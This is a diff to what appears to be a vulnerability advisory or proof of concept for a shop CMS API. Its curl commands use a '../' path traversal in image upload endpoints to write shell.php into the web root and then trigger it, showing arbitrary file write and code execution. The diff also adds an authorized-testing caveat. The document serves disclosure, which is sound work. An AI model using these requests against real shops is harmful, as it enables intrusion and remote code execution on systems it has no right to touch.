@@ -19,7 +19,7 @@ curl -X POST \
   http://<shop-host>/api.php/v3/image-lists/1/images/../../../../shell.php
 ```
 
-This writes to `/home/runner/work/cmstest/cmstest/images/shell.php` (web-accessible).
+This writes to `<web-root>/images/shell.php` (web-accessible).
 
 2. Trigger the payload:
 
@@ -28,3 +28,5 @@ curl http://<shop-host>/images/shell.php
 ```
 
 The response contains `pwned`, demonstrating arbitrary file write and code execution. The same attack works against the option image endpoint by targeting `/api.php/v3/options/1/values/1/image/../../../../shell.php`.
+
+> Use this proof of concept only in fully authorized security testing.
